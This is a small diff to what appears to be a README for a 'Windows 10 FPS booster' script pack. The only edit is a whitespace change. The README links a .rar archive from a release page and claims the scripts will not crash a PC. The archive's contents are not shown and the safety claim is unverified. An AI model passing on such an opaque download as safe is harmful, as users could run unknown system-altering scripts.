@@ -5,7 +5,7 @@
 ### <p align="middle"> DOWNLOAD : [Click Here](https://github.com/Speedyreal/Windows10BoosterFPS/releases/download/Windows10/Windows10BoosterFPS.rar)
   
   ##### <p align="middle"> Everything I leave all credit to who made it. I didn't steal him. 💡
-
+ 
 ##### Hello, this is the scripts I use to customize after windows install, it makes game play smoothly.
 
 ##### Every Scripts won't crash your PC , Which one you don't understand can be searched using Google.
